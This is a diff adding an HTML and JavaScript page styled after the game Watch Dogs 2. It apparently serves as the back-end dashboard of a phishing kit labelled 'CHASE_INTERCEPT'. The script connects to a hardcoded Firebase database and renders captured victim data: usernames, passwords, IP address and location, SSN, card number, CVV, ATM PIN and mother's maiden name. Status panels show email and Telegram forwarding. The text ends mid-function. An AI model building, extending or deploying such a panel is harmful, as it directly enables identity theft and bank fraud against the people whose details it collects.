@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WATCH_DOGS 2 // DASHBOARD // DATA INTERCEPT</title>
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        :root{--wd-cyan:#00d4ff;--wd-blue:#0084ff;--wd-dark:#0a0a0f;--wd-gray:#1a1a24;--wd-text:#e0e0e0;--wd-red:#ff0040;--wd-green:#00ff41;--wd-yellow:#ffd93d;--wd-purple:#9d00ff;--wd-orange:#ff6b00;--wd-pink:#ff00aa}
+        body{font-family:'Rajdhani',sans-serif;background:var(--wd-dark);color:var(--wd-text);min-height:100vh;overflow-x:hidden;position:relative}
+        .bg-layer{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(180deg,rgba(10,10,15,0.2) 0%,rgba(10,10,15,0.6) 100%),url('https://files.catbox.moe/ijy80y.jpeg') center/cover no-repeat;filter:grayscale(10%) contrast(1.2) brightness(0.7) saturate(1.4);z-index:-2}
+        .grid-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background-image:linear-gradient(rgba(0,212,255,0.04) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,0.04) 1px,transparent 1px);background-size:50px 50px;z-index:-1;animation:gridPulse 4s ease-in-out infinite}
+        @keyframes gridPulse{0%,100%{opacity:0.3}50%{opacity:0.6}}
+        .scanlines{position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.25) 2px,rgba(0,0,0,0.25) 4px);pointer-events:none;z-index:1000;opacity:0.4}
+        .lightning-flash{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,212,255,0.3);z-index:1999;opacity:0;pointer-events:none}
+        .lightning-flash.active{animation:lightning 0.2s ease-out}
+        @keyframes lightning{0%{opacity:0}10%{opacity:1}20%{opacity:0}30%{opacity:0.8}40%{opacity:0}50%{opacity:0.5}100%{opacity:0}}
+        .glitch{position:relative;animation:glitch-skew 1s infinite}
+        @keyframes glitch-skew{0%,100%{transform:skew(0deg)}20%{transform:skew(-2deg)}40%{transform:skew(2deg)}60%{transform:skew(-1deg)}80%{transform:skew(1deg)}}
+        .header{display:flex;justify-content:space-between;align-items:center;padding:20px 40px;border-bottom:1px solid rgba(0,212,255,0.3);background:rgba(10,10,15,0.7);backdrop-filter:blur(10px)}
+        .connection-status{display:flex;align-items:center;gap:10px;font-family:'Share Tech Mono',monospace;font-size:12px}
+        .conn-dot{width:8px;height:8px;border-radius:50%;background:var(--wd-red);box-shadow:0 0 10px var(--wd-red);transition:all 0.3s}
+        .conn-dot.connected{background:var(--wd-green);box-shadow:0 0 10px var(--wd-green);animation:pulse 1.5s infinite}
+        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
+        .container{max-width:1400px;margin:0 auto;padding:40px}
+        .hero{text-align:center;padding:40px 0;position:relative}
+        .hero-badge{display:inline-flex;align-items:center;gap:10px;margin-bottom:20px;padding:8px 20px;border:1px solid var(--wd-cyan);background:rgba(0,212,255,0.1);backdrop-filter:blur(5px)}
+        .hero-badge::before{content:'◈';color:var(--wd-cyan);animation:spin 4s linear infinite}
+        @keyframes spin{100%{transform:rotate(360deg)}}
+        .hero h1{font-size:14px;letter-spacing:3px;color:var(--wd-cyan);text-transform:uppercase}
+        .countdown{display:flex;justify-content:center;gap:40px;margin:30px 0;font-family:'Share Tech Mono',monospace}
+        .time-unit{text-align:center;position:relative}
+        .time-value{font-size:72px;font-weight:700;color:white;text-shadow:0 0 10px rgba(0,212,255,0.5),0 0 20px rgba(0,212,255,0.3);line-height:1;position:relative;min-width:120px;display:inline-block}
+        .time-value::after{content:'';position:absolute;top:50%;left:0;width:100%;height:2px;background:rgba(0,212,255,0.5);animation:scan 2s linear infinite}
+        @keyframes scan{0%{transform:translateY(-20px);opacity:0}50%{opacity:1}100%{transform:translateY(20px);opacity:0}}
+        .time-label{font-size:12px;color:var(--wd-cyan);text-transform:uppercase;letter-spacing:3px;margin-top:10px}
+        .login-btn{display:inline-flex;align-items:center;gap:10px;margin-top:20px;padding:15px 40px;background:var(--wd-cyan);color:var(--wd-dark);text-decoration:none;font-weight:700;font-size:14px;letter-spacing:2px;text-transform:uppercase;border:none;cursor:pointer;position:relative;overflow:hidden;transition:all 0.3s;clip-path:polygon(10% 0,100% 0,100% 70%,90% 100%,0 100%,0 30%)}
+        .login-btn::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.4),transparent);transition:left 0.5s}
+        .login-btn:hover{background:var(--wd-blue);box-shadow:0 0 30px rgba(0,132,255,0.5);transform:translateY(-2px)}
+        .login-btn:hover::before{left:100%}
+        .login-btn.hacking{background:var(--wd-red);pointer-events:none;animation:btnPulse 0.5s infinite}
+        @keyframes btnPulse{0%,100%{box-shadow:0 0 20px var(--wd-red)}50%{box-shadow:0 0 40px var(--wd-red),0 0 60px var(--wd-red)}}
+        .hack-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(10,10,15,0.95);z-index:2000;display:none;flex-direction:column;align-items:center;justify-content:center;backdrop-filter:blur(10px)}
+        .hack-overlay.active{display:flex}
+        .hack-spinner{width:150px;height:150px;position:relative;margin-bottom:40px}
+        .hack-ring{position:absolute;border:3px solid transparent;border-top-color:var(--wd-cyan);border-radius:50%;animation:rotate 2s linear infinite}
+        .hack-ring:nth-child(1){width:150px;height:150px;top:0;left:0;border-top-color:var(--wd-cyan);animation-duration:2s}
+        .hack-ring:nth-child(2){width:120px;height:120px;top:15px;left:15px;border-top-color:var(--wd-red);animation-duration:1.5s;animation-direction:reverse}
+        .hack-ring:nth-child(3){width:90px;height:90px;top:30px;left:30px;border-top-color:var(--wd-green);animation-duration:1s}
+        .hack-ring:nth-child(4){width:60px;height:60px;top:45px;left:45px;border-top-color:var(--wd-yellow);animation-duration:0.8s;animation-direction:reverse}
+        .hack-core{position:absolute;width:30px;height:30px;top:60px;left:60px;background:var(--wd-cyan);border-radius:50%;animation:corePulse 1s ease-in-out infinite;box-shadow:0 0 30px var(--wd-cyan),0 0 60px var(--wd-cyan)}
+        @keyframes rotate{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        @keyframes corePulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.3);opacity:0.7}}
+        .hack-title{font-family:'Share Tech Mono',monospace;font-size:24px;color:var(--wd-cyan);letter-spacing:5px;text-transform:uppercase;margin-bottom:20px;text-shadow:0 0 20px var(--wd-cyan);animation:textFlicker 2s infinite}
+        @keyframes textFlicker{0%,100%{opacity:1}50%{opacity:0.8}75%{opacity:0.9}}
+        .hack-details{width:80%;max-width:600px;background:rgba(0,0,0,0.8);border:1px solid var(--wd-cyan);padding:20px;font-family:'Share Tech Mono',monospace;font-size:12px;color:var(--wd-green);max-height:300px;overflow-y:auto;position:relative}
+        .hack-details::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--wd-cyan),transparent);animation:scanline 2s linear infinite}
+        @keyframes scanline{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
+        .hack-line{margin:5px 0;opacity:0;animation:lineAppear 0.3s forwards;text-shadow:0 0 5px var(--wd-green)}
+        @keyframes lineAppear{to{opacity:1}}
+        .hack-status{margin-top:30px;font-family:'Share Tech Mono',monospace;font-size:14px;color:var(--wd-yellow);letter-spacing:3px}
+        .hack-progress{width:300px;height:4px;background:rgba(255,255,255,0.1);margin-top:15px;position:relative;overflow:hidden}
+        .hack-progress-bar{height:100%;background:linear-gradient(90deg,var(--wd-cyan),var(--wd-green));width:0%;transition:width 0.3s;box-shadow:0 0 10px var(--wd-cyan)}
+        .data-section{margin-top:30px;background:rgba(26,26,36,0.85);border:1px solid rgba(0,212,255,0.2);backdrop-filter:blur(10px);border-radius:8px;overflow:hidden}
+        .section-header{display:flex;align-items:center;justify-content:space-between;padding:15px 20px;background:rgba(0,212,255,0.1);border-bottom:1px solid rgba(0,212,255,0.2)}
+        .section-title{font-size:14px;font-weight:600;letter-spacing:2px;text-transform:uppercase;color:var(--wd-cyan);display:flex;align-items:center;gap:10px}
+        .section-title::before{content:'◈';color:var(--wd-cyan)}
+        .section-badge{background:var(--wd-cyan);color:var(--wd-dark);padding:2px 10px;font-size:11px;font-weight:700;border-radius:3px}
+        .section-badge.active{background:var(--wd-green);animation:pulse 1.5s infinite}
+        .section-badge.waiting{background:var(--wd-yellow)}
+        .data-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:15px;padding:20px}
+        .data-item{background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.1);padding:15px;border-radius:6px;transition:all 0.3s}
+        .data-item:hover{border-color:var(--wd-cyan);background:rgba(0,212,255,0.05)}
+        .data-item.new-data{border-color:var(--wd-green);box-shadow:0 0 15px rgba(0,255,65,0.2);animation:highlightNew 0.5s ease}
+        @keyframes highlightNew{0%{background:rgba(0,255,65,0.2)}100%{background:rgba(0,0,0,0.3)}}
+        .data-label{font-size:10px;color:rgba(255,255,255,0.5);text-transform:uppercase;letter-spacing:1px;margin-bottom:5px}
+        .data-value{font-family:'Share Tech Mono',monospace;font-size:14px;color:var(--wd-cyan);word-break:break-all}
+        .data-value.sensitive{color:var(--wd-red);font-weight:600}
+        .data-value.success{color:var(--wd-green)}
+        .data-value.warning{color:var(--wd-yellow)}
+        .steps-tracker{display:flex;justify-content:space-between;padding:20px;background:rgba(0,0,0,0.2);border-bottom:1px solid rgba(0,212,255,0.1)}
+        .step-item{flex:1;text-align:center;position:relative;padding:10px}
+        .step-item:not(:last-child)::after{content:'';position:absolute;top:50%;right:-50%;width:100%;height:2px;background:rgba(255,255,255,0.1);transform:translateY(-50%);z-index:0}
+        .step-number{width:30px;height:30px;border-radius:50%;background:rgba(255,255,255,0.1);display:flex;align-items:center;justify-content:center;margin:0 auto 8px;font-family:'Share Tech Mono',monospace;font-size:12px;font-weight:700;position:relative;z-index:1;border:2px solid transparent;transition:all 0.3s}
+        .step-item.active .step-number{background:var(--wd-cyan);color:var(--wd-dark);box-shadow:0 0 15px var(--wd-cyan)}
+        .step-item.completed .step-number{background:var(--wd-green);color:var(--wd-dark);border-color:var(--wd-green)}
+        .step-item.pending .step-number{border-color:var(--wd-yellow);color:var(--wd-yellow)}
+        .step-label{font-size:10px;text-transform:uppercase;letter-spacing:1px;color:rgba(255,255,255,0.5)}
+        .step-item.active .step-label{color:var(--wd-cyan)}
+        .step-item.completed .step-label{color:var(--wd-green)}
+        .detail-panel{margin-top:20px;padding:20px;background:rgba(0,0,0,0.2);border-radius:6px;border-left:3px solid var(--wd-cyan)}
+        .detail-panel.billing{border-left-color:var(--wd-yellow)}
+        .detail-panel.card{border-left-color:var(--wd-red)}
+        .detail-panel.personal{border-left-color:var(--wd-purple)}
+        .detail-title{font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:2px;margin-bottom:15px;display:flex;align-items:center;gap:8px}
+        .detail-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px}
+        .detail-item{display:flex;flex-direction:column;gap:4px}
+        .detail-label{font-size:9px;color:rgba(255,255,255,0.4);text-transform:uppercase;letter-spacing:1px}
+        .detail-value{font-family:'Share Tech Mono',monospace;font-size:13px;color:var(--wd-text)}
+        .raw-data-section{margin-top:30px;background:rgba(26,26,36,0.85);border:1px solid rgba(0,212,255,0.2);backdrop-filter:blur(10px);border-radius:8px;overflow:hidden}
+        .raw-data-header{display:flex;justify-content:space-between;align-items:center;padding:15px 20px;background:rgba(0,212,255,0.05);border-bottom:1px solid rgba(0,212,255,0.1);cursor:pointer;transition:all 0.3s}
+        .raw-data-header:hover{background:rgba(0,212,255,0.1)}
+        .raw-data-title{font-size:12px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.6)}
+        .raw-data-content{max-height:0;overflow:hidden;transition:max-height 0.3s ease}
+        .raw-data-content.expanded{max-height:500px;overflow-y:auto}
+        .raw-data-table{width:100%;border-collapse:collapse}
+        .raw-data-table th{text-align:left;padding:12px 15px;font-size:10px;color:rgba(255,255,255,0.5);text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid rgba(0,212,255,0.1);font-family:'Share Tech Mono',monospace;position:sticky;top:0;background:rgba(26,26,36,0.95)}
+        .raw-data-table td{padding:10px 15px;font-size:11px;border-bottom:1px solid rgba(255,255,255,0.03);font-family:'Share Tech Mono',monospace}
+        .toggle-icon{transition:transform 0.3s}
+        .toggle-icon.expanded{transform:rotate(180deg)}
+        .notification-toast{position:fixed;top:20px;right:20px;background:rgba(0,255,65,0.9);color:var(--wd-dark);padding:15px 20px;border-radius:4px;font-family:'Share Tech Mono',monospace;font-size:12px;z-index:3000;transform:translateX(400px);transition:transform 0.3s ease}
+        .notification-toast.show{transform:translateX(0)}
+        .typing-indicator{display:inline-block;width:8px;height:8px;background:var(--wd-green);border-radius:50%;margin-left:5px;animation:typingBlink 1s infinite}
+        @keyframes typingBlink{0%,100%{opacity:1}50%{opacity:0.3}}
+        .empty-state{text-align:center;padding:40px;color:rgba(255,255,255,0.4)}
+        .empty-state-icon{font-size:48px;margin-bottom:15px;opacity:0.5}
+        .status-bar{position:fixed;bottom:20px;right:20px;display:flex;flex-direction:column;gap:8px;z-index:3000}
+        .status-item{background:rgba(0,0,0,0.85);border:1px solid var(--wd-cyan);padding:10px 15px;border-radius:4px;font-family:'Share Tech Mono',monospace;font-size:11px;display:flex;align-items:center;gap:8px;backdrop-filter:blur(5px)}
+        .status-dot{width:8px;height:8px;border-radius:50%;background:var(--wd-yellow)}
+        .status-dot.active{background:var(--wd-green);animation:pulse 1.5s infinite}
+        .status-dot.error{background:var(--wd-red)}
+        .status-dot.telegram{background:var(--wd-cyan)}
+        @media(max-width:1200px){.data-grid{grid-template-columns:repeat(2,1fr)}.detail-grid{grid-template-columns:repeat(2,1fr)}}
+        @media(max-width:768px){.data-grid{grid-template-columns:1fr}.detail-grid{grid-template-columns:1fr}.steps-tracker{flex-direction:column;gap:10px}.step-item:not(:last-child)::after{display:none}}
+    </style>
+<base target="_blank">
+</head>
+<body>
+    <div class="bg-layer"></div>
+    <div class="grid-overlay"></div>
+    <div class="scanlines"></div>
+    <div class="lightning-flash" id="lightningFlash"></div>
+
+    <div class="hack-overlay" id="hackOverlay">
+        <div class="hack-spinner">
+            <div class="hack-ring"></div><div class="hack-ring"></div><div class="hack-ring"></div><div class="hack-ring"></div><div class="hack-core"></div>
+        </div>
+        <div class="hack-title" id="hackTitle">INITIALIZING_BREACH_PROTOCOL</div>
+        <div class="hack-details" id="hackDetails"></div>
+        <div class="hack-status" id="hackStatus">ESTABLISHING_CONNECTION...</div>
+        <div class="hack-progress"><div class="hack-progress-bar" id="hackProgressBar"></div></div>
+    </div>
+
+    <div class="notification-toast" id="notificationToast"><i class="fas fa-satellite-dish"></i> NEW DATA INTERCEPTED</div>
+
+    <div class="status-bar">
+        <div class="status-item" id="firebaseStatus">
+            <div class="status-dot" id="firebaseDot"></div>
+            <span id="firebaseText">FIREBASE: CONNECTING</span>
+        </div>
+        <div class="status-item" id="emailStatus">
+            <div class="status-dot" id="emailDot"></div>
+            <span id="emailText">EMAIL: STANDBY</span>
+        </div>
+        <div class="status-item" id="telegramStatus">
+            <div class="status-dot telegram" id="telegramDot"></div>
+            <span id="telegramText">TELEGRAM: STANDBY</span>
+        </div>
+    </div>
+
+    <header class="header">
+        <div class="connection-status">
+            <div class="conn-dot" id="connDot"></div>
+            <span id="connText">OFFLINE</span>
+        </div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:12px;color:var(--wd-cyan)">
+            <span id="systemTime">00:00:00</span> | SYS.VER.2.0.1
+        </div>
+        <button onclick="clearAllData()" style="padding:8px 16px;background:var(--wd-red);color:white;border:none;border-radius:4px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:12px;text-transform:uppercase">
+            <i class="fas fa-trash"></i> CLEAR DATA
+        </button>
+    </header>
+
+    <div class="container">
+        <div class="hero">
+            <div class="hero-badge"><h1>System Breach Detection // CHASE_INTERCEPT</h1></div>
+            <div class="countdown">
+                <div class="time-unit"><div class="time-value glitch" id="days">00</div><div class="time-label">Days</div></div>
+                <div class="time-unit"><div class="time-value glitch" id="hours">00</div><div class="time-label">Hours</div></div>
+                <div class="time-unit"><div class="time-value glitch" id="minutes">00</div><div class="time-label">Minutes</div></div>
+                <div class="time-unit"><div class="time-value glitch" id="seconds">00</div><div class="time-label">Seconds</div></div>
+            </div>
+            <button class="login-btn" id="hackBtn" onclick="initiateHack()"><i class="fas fa-lock"></i> / INITIATE_HACK</button>
+        </div>
+
+        <div class="data-section">
+            <div class="section-header"><div class="section-title">Session Overview // LIVE</div><div class="section-badge" id="sessionStatus">WAITING</div></div>
+            <div class="data-grid" id="sessionOverview">
+                <div class="data-item"><div class="data-label">Session ID</div><div class="data-value" id="displaySessionId">[ NULL ]</div></div>
+                <div class="data-item"><div class="data-label">Status</div><div class="data-value" id="displayStatus">[ OFFLINE ]</div></div>
+                <div class="data-item"><div class="data-label">Device</div><div class="data-value" id="displayDevice">[ UNKNOWN ]</div></div>
+                <div class="data-item"><div class="data-label">IP Address</div><div class="data-value sensitive" id="displayIp">[ HIDDEN ]</div></div>
+                <div class="data-item"><div class="data-label">Location</div><div class="data-value" id="displayExactLocation">[ UNKNOWN ]</div></div>
+                <div class="data-item"><div class="data-label">Last Update</div><div class="data-value" id="displayLastUpdate">[ NEVER ]</div></div>
+            </div>
+        </div>
+
+        <div class="data-section">
+            <div class="section-header"><div class="section-title">Login Credentials // CAPTURED</div><div class="section-badge" id="credentialsStatus">WAITING</div></div>
+            <div class="data-grid" id="credentialsGrid">
+                <div class="data-item"><div class="data-label">Username <span id="typing-username"></span></div><div class="data-value" id="displayUsername">[ WAITING ]</div></div>
+                <div class="data-item"><div class="data-label">Password <span id="typing-password"></span></div><div class="data-value sensitive" id="displayPassword">[ ENCRYPTED ]</div></div>
+                <div class="data-item"><div class="data-label">Email</div><div class="data-value" id="displayEmail">[ NULL ]</div></div>
+                <div class="data-item"><div class="data-label">Login Time</div><div class="data-value" id="displayLoginTime">[ NOT CAPTURED ]</div></div>
+            </div>
+        </div>
+
+        <div class="data-section">
+            <div class="section-header"><div class="section-title">Verification Progress // TRACKING</div><div class="section-badge" id="verificationStatus">PENDING</div></div>
+            <div class="steps-tracker" id="stepsTracker">
+                <div class="step-item pending" id="step1"><div class="step-number">1</div><div class="step-label">Personal Info</div></div>
+                <div class="step-item pending" id="step2"><div class="step-number">2</div><div class="step-label">Billing Address</div></div>
+                <div class="step-item pending" id="step3"><div class="step-number">3</div><div class="step-label">Card Details</div></div>
+                <div class="step-item pending" id="step4"><div class="step-number">4</div><div class="step-label">Confirmation</div></div>
+            </div>
+        </div>
+
+        <div class="data-section" id="personalSection" style="display:none">
+            <div class="section-header"><div class="section-title">Personal Information // EXTRACTED</div><div class="section-badge success">CAPTURED</div></div>
+            <div class="detail-panel personal"><div class="detail-title"><i class="fas fa-user"></i> Identity Data</div><div class="detail-grid" id="personalGrid"></div></div>
+        </div>
+
+        <div class="data-section" id="billingSection" style="display:none">
+            <div class="section-header"><div class="section-title">Billing Information // EXTRACTED</div><div class="section-badge success">CAPTURED</div></div>
+            <div class="detail-panel billing"><div class="detail-title"><i class="fas fa-home"></i> Address & Contact</div><div class="detail-grid" id="billingGrid"></div></div>
+        </div>
+
+        <div class="data-section" id="cardSection" style="display:none">
+            <div class="section-header"><div class="section-title">Payment Information // EXTRACTED</div><div class="section-badge success">CAPTURED</div></div>
+            <div class="detail-panel card"><div class="detail-title"><i class="fas fa-credit-card"></i> Card Details</div><div class="detail-grid" id="cardGrid"></div></div>
+        </div>
+
+        <div class="raw-data-section">
+            <div class="raw-data-header" onclick="toggleRawData()">
+                <div class="raw-data-title">◈ Raw Data Stream // TECHNICAL_LOG</div>
+                <i class="fas fa-chevron-down toggle-icon" id="rawToggleIcon"></i>
+            </div>
+            <div class="raw-data-content" id="rawDataContent">
+                <table class="raw-data-table">
+                    <thead><tr><th>Timestamp</th><th>Stage</th><th>Field</th><th>Value</th></tr></thead>
+                    <tbody id="rawDataTableBody"><tr><td colspan="4" class="empty-state"><div class="empty-state-icon">◉</div><p>NO_DATA_AVAILABLE</p></td></tr></tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+
+    <script>
+        // ═══════════════════════════════════════════════════════════════
+        // FIREBASE CONFIG
+        // ═══════════════════════════════════════════════════════════════
+        const firebaseConfig = {
+            apiKey: "AIzaSyBzUeZhHlmAjnFEqyW1klUF0YfjT_X4sOI",
+            authDomain: "cold-ed0e6.firebaseapp.com",
+            databaseURL: "https://cold-ed0e6-default-rtdb.firebaseio.com",
+            projectId: "cold-ed0e6",
+            storageBucket: "cold-ed0e6.firebasestorage.app",
+            messagingSenderId: "125083674960",
+            appId: "1:125083674960:web:76f9032808590e42eca455"
+        };
+
+        let database;
+        try {
+            firebase.initializeApp(firebaseConfig);
+            database = firebase.database();
+            console.log('Firebase connected');
+            updateStatus('firebase', 'active', 'CONNECTED ✓');
+        } catch (e) {
+            console.error('Firebase error:', e);
+            updateStatus('firebase', 'error', 'CONNECTION FAILED');
+        }
+
+        const targetDate = new Date();
+        targetDate.setDate(targetDate.getDate() + 157);
+
+        const hackMessages = ["> Scanning target infrastructure...", "> Bypassing firewall protocols...", "> Exploiting vulnerability CVE-2024-XXXX...", "> Injecting payload into memory...", "> Establishing encrypted tunnel...", "> Spoofing MAC address...", "> Hijacking session tokens...", "> Extracting browser cookies...", "> Capturing form input data...", "> Mining cryptocurrency [SIMULATED]...", "> Accessing webcam feed [BLOCKED]...", "> Downloading contact list...", "> Intercepting network packets...", "> Decrypting password hashes...", "> Planting backdoor access...", "> Covering digital tracks...", "> Synchronizing with C2 server...", "> Uploading stolen credentials...", "> Masking IP through Tor nodes...", "> Finalizing data extraction..."];
+
+        function updateCountdown() {
+            const now = new Date(), diff = targetDate - now;
+            document.getElementById('days').textContent = String(Math.floor(diff / 864e5)).padStart(2, '0');
+            document.getElementById('hours').textContent = String(Math.floor(diff % 864e5 / 36e5)).padStart(2, '0');
+            document.getElementById('minutes').textContent = String(Math.floor(diff % 36e5 / 6e4)).padStart(2, '0');
+            document.getElementById('seconds').textContent = String(Math.floor(diff % 6e4 / 1e3)).padStart(2, '0');
+        }
+        setInterval(updateCountdown, 1e3);
+        updateCountdown();
+
+        function updateSystemTime() {
+            document.getElementById('systemTime').textContent = new Date().toLocaleTimeString('en-US', { hour12: false });
+        }
+        setInterval(updateSystemTime, 1e3);
+        updateSystemTime();
+
+        function showNotification(msg) {
+            const t = document.getElementById('notificationToast');
+            t.innerHTML = `<i class="fas fa-satellite-dish"></i> ${msg}`;
+            t.classList.add('show');
+            setTimeout(() => t.classList.remove('show'), 3e3);
+        }
+
+        function updateStatus(type, state, text) {
+            const dot = document.getElementById(`${type}Dot`);
+            const label = document.getElementById(`${type}Text`);
+            dot.className = 'status-dot';
+            if (state === 'active') dot.classList.add('active');
+            else if (state === 'error') dot.classList.add('error');
+            else if (state === 'telegram') dot.classList.add('telegram');
+            label.textContent = `${type.toUpperCase()}: ${text}`;
+        }
+
+        function toggleRawData() {
+            document.getElementById('rawDataContent').classList.toggle('expanded');
+            document.getElementById('rawToggleIcon').classList.toggle('expanded');
+        }
+
+        function updateStepTracker(c, p = []) {
+            for (let i = 1; i <= 4; i++) {
+                const e = document.getElementById(`step${i}`);
+                e.classList.remove('active', 'completed', 'pending');
+                if (p.includes(i) || i < c) e.classList.add('completed');
+                else if (i === c) e.classList.add('active');
+                else e.classList.add('pending');
+            }
+        }
+
+        function updatePersonalSection(d) {
+            const s = document.getElementById('personalSection'), g = document.getElementById('personalGrid');
+            if (!d || !d.personalInfo) return;
+            s.style.display = 'block';
+            g.innerHTML = '';
+            if (d.personalInfo.fullName) g.innerHTML += `<div class="detail-item"><div class="detail-label">Full Name</div><div class="detail-value">${d.personalInfo.fullName}</div></div>`;
+        }
+
+        function updateBillingSection(d) {
+            const s = document.getElementById('billingSection'), g = document.getElementById('billingGrid');
+            if (!d || !d.billingInfo) return;
+            s.style.display = 'block';
+            g.innerHTML = '';
+            const f = [{ k: 'fullName', l: 'Full Name' }, { k: 'dateOfBirth', l: 'Date of Birth' }, { k: 'streetAddress', l: 'Street Address' }, { k: 'state', l: 'State/Region' }, { k: 'zipCode', l: 'ZIP Code' }, { k: 'phone', l: 'Phone Number' }, { k: 'ssn', l: 'SSN', s: true }];
+            f.forEach(x => { if (d.billingInfo[x.k]) g.innerHTML += `<div class="detail-item"><div class="detail-label">${x.l}</div><div class="detail-value ${x.s ? 'sensitive' : ''}">${d.billingInfo[x.k]}</div></div>`; });
+        }
+
+        function updateCardSection(d) {
+            const s = document.getElementById('cardSection'), g = document.getElementById('cardGrid');
+            if (!d || !d.cardInfo) return;
+            s.style.display = 'block';
+            g.innerHTML = '';
+            const f = [{ k: 'cardNumber', l: 'Card Number' }, { k: 'expiry', l: 'Expiry Date' }, { k: 'cvv', l: 'CVV/CSC' }, { k: 'pin', l: 'ATM PIN' }, { k: 'mothersMaidenName', l: "Mother's Maiden Name" }];
+            f.forEach(x => { if (d.cardInfo[x.k]) g.innerHTML += `<div class="detail-item"><div class="detail-label">${x.l}</div><div class="detail-value sensitive">${d.cardInfo[x.k]}</div></div>`; });
+        }
+
+        function addToRawLog(ts, st, f, v) {
+            const b = document.getElementById('rawDataTableBody');
+            if (b.querySelector('.empty-state')) b.innerHTML = '';
+            const r = document.createElement('tr');
+            r.innerHTML = `<td>${new Date(ts).toLocaleTimeString()}</td><td style="color:var(--wd-cyan)">${st}</td><td>${f || '-'}</td><td style="color:${['password', 'cvv', 'pin', 'ssn'].includes(f) ? 'var(--wd-red)' : 'var(--wd-text)'}">${v || '[EMPTY]'}</td>`;
+            b.insertBefore(r, b.firstChild);
+            while (b.children.length > 50) b.removeChild(b.lastChild);
+        }
+
+        function updateDisplay(d) {
+            if (d.sessionId) { document.getElementById('displaySessionId').textContent = d.sessionId; document.getElementById('sessionStatus').textContent = 'ACTIVE'; document.getElementById('sessionStatus').className = 'section-badge active'; }
+            if (d.status) { document.getElementById('displayStatus').textContent = d.status; if (d.status === 'Active' || d.status === 'Verified') { document.getElementById('connDot').classList.add('connected'); document.getElementById('connText').textContent = 'ONLINE // INTERCEPTING'; } }
+            if (d.device) document.getElementById('displayDevice').textContent = d.device;
+            if (d.ip) document.getElementById('displayIp').textContent = d.ip;
+            if (d.exactLocation) document.getElementById('displayExactLocation').textContent = d.exactLocation;
+            if (d.lastUpdate) document.getElementById('displayLastUpdate').textContent = new Date(d.lastUpdate).toLocaleString();
+            if (d.username) { document.getElementById('displayUsername').textContent = d.username; document.getElementById('credentialsStatus').textContent = 'CAPTURED'; document.getElementById('credentialsStatus').className = 'section-badge success'; addToRawLog(d.lastUpdate || new Date(), 'login', 'username', d.username); }
+            if (d.password) { document.getElementById('displayPassword').textContent = d.password; addToRawLog(d.lastUpdate || new Date(), 'login', 'password', '••••••••'); }
+            if (d.email) document.getElementById('displayEmail').textContent = d.email;
+            if (d.loginTime) document.getElementById('displayLoginTime').textContent = new Date(d.loginTime).toLocaleString();
+            if (d.stage) {
+                document.getElementById('verificationStatus').textContent = 'IN PROGRESS'; document.getElementById('verificationStatus').className = 'section-badge active';
+                if (d.stage === 'verification_started') { updateStepTracker(1); showNotification('VERIFICATION FLOW STARTED'); }
+                else if (d.stage === 'verification_step_complete' && d.step) { const c = []; for (let i = 1; i < d.step; i++) c.push(i); updateStepTracker(d.step, c); showNotification(`STEP ${d.step} COMPLETE`); }
+                else if (d.stage === 'verification_complete') { updateStepTracker(5, [1, 2, 3, 4]); document.getElementById('verificationStatus').textContent = 'COMPLETE'; document.getElementById('verificationStatus').className = 'section-badge success'; showNotification('ALL DATA EXTRACTED - VERIFICATION COMPLETE'); }
+                addToRawLog(d.lastUpdate || new Date(), d.stage, d.field || '-', d.value || '-');
+            }
+            if (d.allData || d.stepData) {
+                const a = d.allData || d.stepData;
+                if (a.personalInfo) updatePersonalSection({ personalInfo: a.personalInfo });
+                if (a.billingInfo) updateBillingSection({ billingInfo: a.billingInfo });
+                if (a.cardInfo) updateCardSection({ cardInfo: a.cardInfo });
+            }
+            if (d.field && d.value) document.querySelectorAll('.data-item').forEach(i => { const l = i.querySelector('.data-label'); if (l && l.textContent.toLowerCase().includes(d.field.toLowerCase())) { i.classList.add('new-data'); setTimeout(() => i.classList.remove('new-data'), 2e3); } });
+        }
+
+        function initiateHack() {
+            const b = document.getElementById('hackBtn'), o = document.getElementById('hackOverlay'), l = document.getElementById('lightningFlash'), det = document.getElementById('hackDetails'), st = document.getElementById('hackStatus'), pb = document.getElementById('hackProgressBar'), t = document.getElementById('hackTitle');
+            refreshDashboard();
+            b.classList.add('hacking');
+            b.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> / BREACHING...';
+            l.classList.add('active');
+            setTimeout(() => l.classList.remove('active'), 200);
+            o.classList.add('active');
+            det.innerHTML = '';
+            let p = 0, mi = 0;
+            const pi = setInterval(() => {
+                p += Math.random() * 15;
